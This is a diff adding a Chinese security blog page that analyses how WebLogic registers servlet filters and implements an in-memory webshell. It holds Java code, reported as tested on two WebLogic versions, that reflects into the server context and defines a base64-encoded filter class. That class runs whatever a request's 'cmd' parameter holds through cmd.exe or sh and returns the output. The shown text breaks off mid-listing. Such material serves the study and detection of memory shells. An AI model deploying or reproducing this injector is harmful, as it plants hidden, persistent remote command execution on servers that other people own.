@@ -1,0 +1,1740 @@
+<!DOCTYPE html>
+<html lang="zh-CN" data-theme="dark">
+    <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
+    <meta charset="UTF-8" />
+
+    <meta name="generator" content="Hugo 0.88.1" /><meta name="theme-color" content="#16171d" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
+    
+    <meta http-equiv="Cache-Control" content="no-transform" />
+    
+    <meta http-equiv="Cache-Control" content="no-siteapp" />
+
+    <title>Weblogic 内存马分析与实现 | MYZXCG</title>
+
+    <link rel="stylesheet" href="/css/meme.min.ee7d92038178eda958210f69458541e2686ada11055b93762d6d324f2acc47c5.css"/>
+
+    
+    
+        <script src="/js/meme.min.4194bf2034241e3757fbbbf5fe4db43d0ff17c81f4496e6bc931504f0978cbd2.js"></script>
+
+    
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
+        <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
+
+    <meta name="author" content="myzxcg" /><meta name="description" content="Filter Filter 加载过程分析 Weblogic Filter内存马和Tomcat其实差不多。 在weblogic.s……" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
+    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-title" content="MYZXCG" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black" />
+    <meta name="mobile-web-app-capable" content="yes" />
+    <meta name="application-name" content="MYZXCG" />
+    <meta name="msapplication-starturl" content="../../../" />
+    <meta name="msapplication-TileColor" content="#603cba" />
+    <meta name="msapplication-TileImage" content="../../../icons/mstile-150x150.png" />
+    <link rel="manifest" href="/manifest.json" />
+
+
+    
+    
+
+    
+    <link rel="canonical" href="https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" />
+    
+
+<script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "BlogPosting",
+        "datePublished": "2021-11-06T22:02:36+08:00",
+        "dateModified": "2021-11-20T14:00:01+08:00",
+        "url": "https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/",
+        "headline": "Weblogic 内存马分析与实现",
+        "description": "Filter Filter 加载过程分析 Weblogic Filter内存马和Tomcat其实差不多。 在weblogic.s……",
+        "inLanguage" : "zh-CN",
+        "articleSection": "posts",
+        "wordCount":  4967 ,
+        "image": ["https://myzxcg.com/images/image-20211106220512.png","https://myzxcg.com/images/image-20211106220554.png","https://myzxcg.com/images/image-20211106220618.png","https://myzxcg.com/images/image-20211106220644.png","https://myzxcg.com/images/image-20211106220657.png","https://myzxcg.com/images/image-20211106220720.png","https://myzxcg.com/images/image-20211106220741.png","https://myzxcg.com/images/image-20211106220802.png","https://myzxcg.com/images/image-20211106220822.png","https://myzxcg.com/images/image-20211106220909.png","https://myzxcg.com/images/image-20211106220946.png","https://myzxcg.com/images/image-20211106221005.png","https://myzxcg.com/images/image-20211106221024.png","https://myzxcg.com/images/image-20211106221043.png","https://myzxcg.com/images/image-20211106221216.png","https://myzxcg.com/images/image-20211106221250.png","https://myzxcg.com/images/image-20211106221438.png"],
+        "author": {
+            "@type": "Person",
+            "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
+            "email": "myzx.xcg@gmail.com",
+            "image": "https://myzxcg.com/avatar.png",
+            "url": "https://myzxcg.com/",
+            "name": "myzxcg"
+        },
+        "license": "[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)",
+        "publisher": {
+            "@type": "Organization",
+            "name": "MYZXCG",
+            "logo": {
+                "@type": "ImageObject",
+                "url": "https://myzxcg.com/icons/favicon.ico"
+            },
+            "url": "https://myzxcg.com/"
+        },
+        "mainEntityOfPage": {
+            "@type": "WebSite",
+            "@id": "https://myzxcg.com/"
+        }
+    }
+</script>
+
+    
+
+<meta name="twitter:card" content="summary_large_image" />
+
+
+<meta name="twitter:site" content="@myzxcg" />
+<meta name="twitter:creator" content="@myzxcg" />
+
+    
+
+
+
+<meta property="og:title" content="Weblogic 内存马分析与实现" />
+<meta property="og:description" content="Filter Filter 加载过程分析 Weblogic Filter内存马和Tomcat其实差不多。 在weblogic.s……" />
+<meta property="og:url" content="https://myzxcg.com/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" />
+<meta property="og:site_name" content="MYZXCG" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/image-20211106220512.png" />
+<meta property="og:type" content="article" />
+    <meta property="article:published_time" content="2021-11-06T22:02:36&#43;08:00" />
+    <meta property="article:modified_time" content="2021-11-20T14:00:01&#43;08:00" />
+    
+    <meta property="article:section" content="posts" />
+
+
+        <link rel="preconnect" href="https://www.google-analytics.com" crossorigin />
+
+        
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y0LZRMN44V"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'G-Y0LZRMN44V');
+    </script>
+
+
+
+
+    
+    
+
+    
+</head>
+
+    <body>
+        <div class="container">
+            
+    <header class="header">
+        
+            <div class="header-wrapper">
+                <div class="header-inner single">
+                    
+    <div class="site-brand">
+        
+            <a href="/" class="brand">MYZXCG</a>
+        
+    </div>
+
+                    <nav class="nav">
+    <ul class="menu" id="menu">
+        
+            
+        
+        
+        
+        
+            
+                <li class="menu-item"><a href="/archives/"><span class="menu-item-name">文章</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/tags/"><span class="menu-item-name">标签</span></a>
+                </li>
+            
+        
+            
+                <li class="menu-item"><a href="/about/"><span class="menu-item-name">关于</span></a>
+                </li>
+            
+        
+            
+                
+                    
+                    
+                
+            
+        
+            
+                
+            
+        
+    </ul>
+</nav>
+
+                    
+                </div>
+            </div>
+            
+    <input type="checkbox" id="nav-toggle" aria-hidden="true" />
+    <label for="nav-toggle" class="nav-toggle"></label>
+    <label for="nav-toggle" class="nav-curtain"></label>
+
+
+        
+    </header>
+
+
+
+
+            
+            
+    <main class="main single" id="main">
+    <div class="main-inner">
+
+        
+
+        <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
+
+            <h1 class="post-title p-name">Weblogic 内存马分析与实现</h1>
+
+            
+
+            
+                
+            
+
+            
+                
+
+<div class="post-meta">
+    
+        
+        <time datetime="2021-11-06T22:02:36&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.11.6</time>
+    
+    
+    
+    
+        
+        
+        
+            
+        
+    
+    
+    
+        
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;10&nbsp;分钟</span>
+    
+
+   
+    
+
+    
+    
+</div>
+
+            
+
+            <nav class="contents">
+  <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
+    <li><a id="contents:filter" href="#filter">Filter</a>
+      <ol>
+        <li><a id="contents:filter-加载过程分析" href="#filter-加载过程分析">Filter 加载过程分析</a></li>
+        <li><a id="contents:实现代码" href="#实现代码">实现代码</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:listener" href="#listener">Listener</a>
+      <ol>
+        <li><a id="contents:listener-注册过程分析" href="#listener-注册过程分析">Listener 注册过程分析</a></li>
+        <li><a id="contents:实现代码-1" href="#实现代码-1">实现代码</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:servlet" href="#servlet">Servlet</a></li>
+    <li><a id="contents:获取webappservletcontext" href="#获取webappservletcontext">获取WebAppServletContext</a>
+      <ol>
+        <li><a id="contents:获取所有-context" href="#获取所有-context">获取所有 Context</a></li>
+        <li><a id="contents:从当前线程中获取-context" href="#从当前线程中获取-context">从当前线程中获取 Context</a></li>
+        <li><a id="contents:从request获取-context" href="#从request获取-context">从Request获取 Context</a></li>
+        <li><a id="contents:获取随机路径" href="#获取随机路径">获取随机路径</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:内存马查杀" href="#内存马查杀">内存马查杀</a></li>
+    <li><a id="contents:测试注意事项" href="#测试注意事项">测试注意事项</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
+  </ol>
+</nav><div class="post-body e-content">
+                <h2 id="filter"><a href="#filter" class="anchor-link">#</a><a href="#contents:filter" class="headings">Filter</a></h2>
+<h3 id="filter-加载过程分析"><a href="#filter-加载过程分析" class="anchor-link">#</a><a href="#contents:filter-加载过程分析" class="headings">Filter 加载过程分析</a></h3>
+<p>Weblogic Filter内存马和Tomcat其实差不多。</p>
+<p>在<code>weblogic.servlet.internal.WebAppServletContext#wrapRun</code>中通过getFilterChain()获取包含Filter链的FilterChainImpl对象。
+<img src="/images/image-20211106220512.png" alt="">
+跟进<code>getFilterChain()</code>方法，该方法在<code>weblogic.servlet.internal.FilterManager</code>类中，可以看到该方法实例化了一个FilterChainImpl类，并添加包含Filter的wrapper到该对象中。
+<img src="/images/image-20211106220554.png" alt="">
+返回FilterChainImpl对象
+<img src="/images/image-20211106220618.png" alt="">
+获取了FilterChainImpl对象后，再调用该对象的doFilter()方法，跟进doFilter()方法。可以看到这步就获取注册的Filter类，并调用Filter的doFilter方法。
+<img src="/images/image-20211106220644.png" alt="">
+<img src="/images/image-20211106220657.png" alt="">
+<strong>手动注册Filter类</strong></p>
+<p>在<code>weblogic.servlet.internal.FilterManager</code>类中有一个registerFilter方法可以动态注册Filter。
+<img src="/images/image-20211106220720.png" alt="">
+该方法中，创建FilterWrapper对象传入FilterClassName字符串后，在<code>this.loadFilter(fw)</code>中对该filter类进行加载。
+<img src="/images/image-20211106220741.png" alt="">
+loadFilter中调用<code>this.context.createInstance(filterClassName)</code>对类进行加载，跟进查看。
+<img src="/images/image-20211106220802.png" alt="">
+使用的是weblogic自己定义的一个classloader，调用自定义的loadclass方法。<code>ChangeAwareClassLoader.loadClass</code>方法会从cache中查找是否存在待查找的类，也就是this.cachedClasses这个变量。
+<img src="/images/image-20211106220822.png" alt="">
+总结: 如果要手动注册Filter，只需要将恶意filter添加到cachedClasses中，然后调用registerFilter接口进行添加即可。</p>
+<h3 id="实现代码"><a href="#实现代码" class="anchor-link">#</a><a href="#contents:实现代码" class="headings">实现代码</a></h3>
+<p><strong><em>Tips:</em></strong> 代码解释看注释</p>
+<p>测试weblogic 1036和12.1.3成功</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">com.example.web</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">sun.misc.BASE64Decoder</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.ServletRequestImpl</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">weblogic.servlet.internal.WebAppServletContext</span><span class="o">;</span>
+
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">javax.servlet.http.*</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloServlet</span> <span class="kd">extends</span> <span class="n">HttpServlet</span> <span class="o">{</span>
+    <span class="kd">private</span> <span class="n">String</span> <span class="n">message</span><span class="o">;</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">init</span><span class="o">()</span> <span class="o">{</span>
+        <span class="n">message</span> <span class="o">=</span> <span class="s">&#34;Hello World!&#34;</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">doGet</span><span class="o">(</span><span class="n">HttpServletRequest</span> <span class="n">request</span><span class="o">,</span> <span class="n">HttpServletResponse</span> <span class="n">response</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+        <span class="n">Thread</span> <span class="n">thread</span> <span class="o">=</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">();</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//获取WebAppServletContext
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">workEntry</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;weblogic.work.ExecuteThread&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;workEntry&#34;</span><span class="o">);</span>
+            <span class="n">workEntry</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">Object</span> <span class="n">workentry</span> <span class="o">=</span> <span class="n">workEntry</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">thread</span><span class="o">);</span>
+            <span class="n">WebAppServletContext</span> <span class="n">webAppServletContext</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>
+            <span class="k">try</span><span class="o">{</span> <span class="c1">//weblogic 12.1.3
+</span><span class="c1"></span>                <span class="n">Field</span> <span class="n">connectionHandler</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;connectionHandler&#34;</span><span class="o">);</span>
+                <span class="n">connectionHandler</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">Object</span> <span class="n">http</span> <span class="o">=</span> <span class="n">connectionHandler</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
+
+                <span class="n">Field</span> <span class="n">request1</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;request&#34;</span><span class="o">);</span>
+                <span class="n">request1</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">ServletRequestImpl</span> <span class="n">servletRequest</span> <span class="o">=</span> <span class="o">(</span><span class="n">ServletRequestImpl</span><span class="o">)</span> <span class="n">request1</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">http</span><span class="o">);</span>
+
+                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">servletRequest</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">servletRequest</span><span class="o">);</span>
+
+            <span class="o">}</span><span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">){</span>
+                <span class="c1">//weblogic 1036
+</span><span class="c1"></span>                <span class="n">Field</span> <span class="n">context</span> <span class="o">=</span> <span class="n">workentry</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;context&#34;</span><span class="o">);</span>
+                <span class="n">context</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+                <span class="n">webAppServletContext</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebAppServletContext</span><span class="o">)</span> <span class="n">context</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">workentry</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="k">if</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">==</span><span class="kc">null</span><span class="o">){</span><span class="k">throw</span> <span class="k">new</span> <span class="n">Exception</span><span class="o">(</span><span class="s">&#34;null&#34;</span><span class="o">);}</span>
+            <span class="c1">//加载字节码
+</span><span class="c1"></span>            <span class="n">String</span> <span class="n">encode_class</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAkgoAHgBJCAA/CwBKAEsIAEwKAE0ATgoACQBPCABQCgAJAFEHAFIIAFMIAFQIAFUIAFYKAFcAWAoAVwBZCgBaAFsHAFwKABEAXQgAXgoAEQBfCgARAGAKABEAYQgAYgsAYwBkCgBlAGYKAGUAZwoAZQBoCwBpAGoHAGsHAGwHAG0BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAC0xjbWRGaWx0ZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcAbgEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjspVgEABGNtZHMBABNbTGphdmEvbGFuZy9TdHJpbmc7AQACaW4BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAAFzAQATTGphdmEvdXRpbC9TY2FubmVyOwEABm91dHB1dAEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABndyaXRlcgEAEExqYXZhL2lvL1dyaXRlcjsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA2NtZAEADVN0YWNrTWFwVGFibGUHAFIHADAHAG8HAFwHAHABAAdkZXN0cm95AQAKU291cmNlRmlsZQEADmNtZEZpbHRlci5qYXZhDAAgACEHAHEMAHIAcwEAB29zLm5hbWUHAHQMAHUAcwwAdgB3AQADd2luDAB4AHkBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jAQACc2gBAAItYwcAegwAewB8DAB9AH4HAH8MAIAAgQEAEWphdmEvdXRpbC9TY2FubmVyDAAgAIIBAAJcYQwAgwCEDACFAIYMAIcAdwEAAAcAiAwAiQCKBwCLDACMAI0MAI4AIQwAjwAhBwCQDAAtAJEBAAljbWRGaWx0ZXIBABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YXgvc2VydmxldC9GaWx0ZXIBAB5qYXZheC9zZXJ2bGV0L1NlcnZsZXRFeGNlcHRpb24BABNqYXZhL2lvL0lucHV0U3RyZWFtAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAOamF2YS9pby9Xcml0ZXIBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAFY2xvc2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgAhAB0AHgABAB8AAAAEAAEAIAAhAAEAIgAAAC8AAQABAAAABSq3AAGxAAAAAgAjAAAABgABAAAABQAkAAAADAABAAAABQAlACYAAAABACcAKAACACIAAAA1AAAAAgAAAAGxAAAAAgAjAAAABgABAAAACQAkAAAAFgACAAAAAQAlACYAAAAAAAEAKQAqAAEAKwAAAAQAAQAsAAEALQAuAAIAIgAAAYAABAAKAAAAoisSArkAAwIAOgQZBMYAjQE6BRIEuAAFtgAGEge2AAiZABsGvQAJWQMSClNZBBILU1kFGQRTOgWnABgGvQAJWQMSDFNZBBINU1kFGQRTOgW4AA4ZBbYAD7YAEDoGuwARWRkGtwASEhO2ABQ6BxkHtgAVmQALGQe2ABanAAUSFzoILLkAGAEAOgkZCRkItgAZGQm2ABoZCbYAGy0rLLkAHAMAsQAAAAMAIwAAAD4ADwAAAA0ACgAOAA8ADwASABEAIgASADoAFABPABcAXAAYAGwAGQCAABoAiAAbAI8AHACUAB0AmQAfAKEAIAAkAAAAZgAKABIAhwAvADAABQBcAD0AMQAyAAYAbAAtADMANAAHAIAAGQA1ADYACACIABEANwA4AAkAAACiACUAJgAAAAAAogA5ADoAAQAAAKIAOwA8AAIAAACiAD0APgADAAoAmAA/ADYABABAAAAAHAAF/QA6BwBBBwBCFP0ALAcAQwcAREEHAEH4ABoAKwAAAAYAAgBFACwAAQBGACEAAQAiAAAAKwAAAAEAAAABsQAAAAIAIwAAAAYAAQAAACcAJAAAAAwAAQAAAAEAJQAmAAAAAQBHAAAAAgBI&#34;</span><span class="o">;</span>
+            <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode_class</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BASE64Decoder</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">encode_class</span><span class="o">);</span>
+            <span class="n">Method</span> <span class="n">defineClass</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">&#34;defineClass&#34;</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>
+            <span class="n">defineClass</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="c1">//这里为了适配weblogic 1036 必须反射获取webAppServletContext中的classLoader
+</span><span class="c1"></span>            <span class="n">Field</span> <span class="n">loader</span> <span class="o">=</span> <span class="n">webAppServletContext</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;classLoader&#34;</span><span class="o">);</span>
+            <span class="n">loader</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+            <span class="n">ClassLoader</span> <span class="n">ClassLoader0</span><span class="o">=</span> <span class="o">(</span><span class="n">ClassLoader</span><span class="o">)</span> <span class="n">loader</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">webAppServletContext</span><span class="o">);</span>
+            <span class="n">Class</span> <span class="n">filter_class</span> <span class="o">=</span> <span class="o">(</span><span class="n">Class</span><span class="o">)</span> <span class="n">defineClass</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">ClassLoader0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">,</span> <span class="n">0</span><span class="o">,</span> <span class="n">decode_class</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+
